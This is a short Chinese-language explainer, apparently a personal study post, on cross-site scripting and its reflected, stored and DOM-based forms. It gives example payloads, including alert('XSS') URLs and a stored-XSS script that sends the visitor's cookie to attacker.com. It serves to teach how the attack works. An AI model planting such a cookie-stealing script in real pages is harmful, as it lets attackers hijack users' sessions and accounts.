		XSS
  XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序，一般伪装成需要加载的图片，js文件，和html语句，这些文件的加载一般不需要用户确认，在用户点击页面加载网页时这些恶意代码就会被加载和执行。这些恶意网页程序攻击成功后，攻击者可以得到更高的权限,私密网页内容,当前会话和cookie等内容，由此当你的cookie和当前会话信息被盗取，攻击者就可以模拟登录你的账号，并且进行财务等其他操作，你的账号沦为其他人的作案工具。
通常XSS攻击因恶意脚本的不同行为一般被分为3类反射型XSS存储型XSS。
  1.反射型XSS攻击通常发生在攻击者诱使用户点击一个包含恶意脚本的链接，或者提交一个包含恶意脚本的表单，这些脚本通常是JavaScript代码。当服务器接收到请求后，如果没有对输入进行适当的验证和转义，服务器会将恶意脚本作为请求的一部分反射回用户的浏览器。浏览器在处理响应时，会执行这些脚本，从而导致XSS攻击。由于这种攻击不涉及将恶意脚本存储在服务器上，所以称为反射型XSS。
https://example.com/search?q=<script>alert('XSS')</script>这个URL是构建来触发反射型XSS的，后面的js语句即为恶意代码。q参数的值被用作搜索查询，并被直接插入到返回的HTML页面中，从而触发XSS攻击.
  2.存储型XSS攻击发生在恶意脚本被永久存储在目标服务器上，例如数据库、消息论坛、访客留言板等。当其他用户访问受感染的页面时，恶意脚本将在他们的浏览器中执行。这种攻击的危害性更大，因为它不需要用户点击特定的链接或提交表单，任何访问受感染页面的用户都可能成为受害者。如果你在评论区留下了这代码，就会被存在服务器上<script>document.location='http://attacker.com/?cookie='+document.cookie</script>
那么下一个点击或者加载该页面就被攻击了。他的cookie将会这段被js代码发送到攻击者这边。
  3.基于DOM的XSS攻击完全发生在客户端，不需要服务器的参与。攻击者通过构造特殊的URL，包含恶意脚本，当用户访问这个URL时，恶意脚本会在用户的浏览器中执行。这种攻击利用了客户端JavaScript对DOM（文档对象模型）的操作，通过修改页面的DOM结构，使得恶意脚本得以执行。由于这种攻击不涉及服务器端的存储或反射，所以称为基于DOM的XSS。https://example.com/page?param=<script>alert('XSS')</script>。
By mumu_aqa 2024.05.23



